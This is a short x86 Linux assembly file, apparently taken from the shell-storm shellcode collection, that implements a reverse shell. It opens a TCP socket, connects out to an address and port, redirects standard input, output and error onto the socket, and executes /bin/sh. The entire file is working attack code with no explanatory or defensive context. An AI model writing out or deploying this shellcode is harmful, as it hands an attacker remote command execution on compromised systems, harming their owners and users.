; http://shell-storm.org/shellcode/files/shellcode-849.php
; Reverse shell

section .text

	global _start

_start:

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov al,0x66
	mov bl,0x1
	push ecx 
	push 0x6
	push 0x1
	push 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax
	mov al,0x66
	xor ebx,ebx
	mov bl,0x2
	push 0x0
	push word 0x697a
	push bx
	inc bl
	mov ecx,esp
	push 0x10
	push ecx 
	push esi 
	mov ecx,esp
	int 0x80
	xor ecx,ecx
	mov cl,0x3

dupfd:

	dec cl
	mov al,0x3f
	int 0x80
	jne dupfd
	xor eax,eax
	push edx 
	push 0x68732f6e
	push 0x69622f2f
	mov ebx,esp
	push edx 
	push ebx 
	mov ecx,esp
	push edx 
	mov edx,esp
	mov al,0xb
	int 0x80
